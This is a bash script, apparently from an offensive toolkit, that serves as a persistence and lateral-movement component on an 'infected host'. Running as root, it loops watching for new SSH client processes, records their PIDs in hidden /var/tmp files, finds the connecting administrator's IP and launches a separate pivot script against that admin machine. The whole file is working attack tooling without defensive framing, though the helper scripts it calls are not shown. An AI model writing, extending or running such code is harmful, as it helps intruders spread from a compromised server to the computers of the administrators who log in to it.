#!/usr/bin/env bash
# Persistence: on new ssh client to infected host → auto-pivot.
# Usage: sudo SSH_SERVER_PORT=22 ./watch_ssh_client_pivot.sh [ADMIN_IP]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib.sh
source "$DIR/lib.sh"

ADMIN_IP="${1:-}"
export SSH_SERVER_PORT="${SSH_SERVER_PORT:-22}"
export VICTIM_USER="${VICTIM_USER:-legacy}"
INTERVAL="${INTERVAL:-3}"
STATE="${STATE_FILE:-/var/tmp/.ssh_pivot_seen_pids}"
LOG="${WATCH_LOG:-/var/tmp/ssh_pivot.log}"

touch "$STATE"
export ADMIN_USER="${ADMIN_USER:-admin}" ADMIN_SSH_PORT="${ADMIN_SSH_PORT:-22}"

while true; do
  while read -r pid; do
    [[ -z "$pid" ]] && continue
    grep -qx "$pid" "$STATE" 2>/dev/null && continue
    echo "$pid" >>"$STATE"
    echo "[watch] new ssh client PID=$pid" | tee -a "$LOG"
    target_ip="$ADMIN_IP"
    [[ -n "$target_ip" ]] || target_ip="$(admin_ip_from_ss)"
    [[ -n "$target_ip" ]] || { echo "[watch] skip PID=$pid (no ADMIN_IP)" | tee -a "$LOG"; continue; }
    "$DIR/pivot_infected_admin.sh" "$target_ip" >>"$LOG" 2>&1 || true
  done < <(ssh_client_pids)
  sleep "$INTERVAL"
done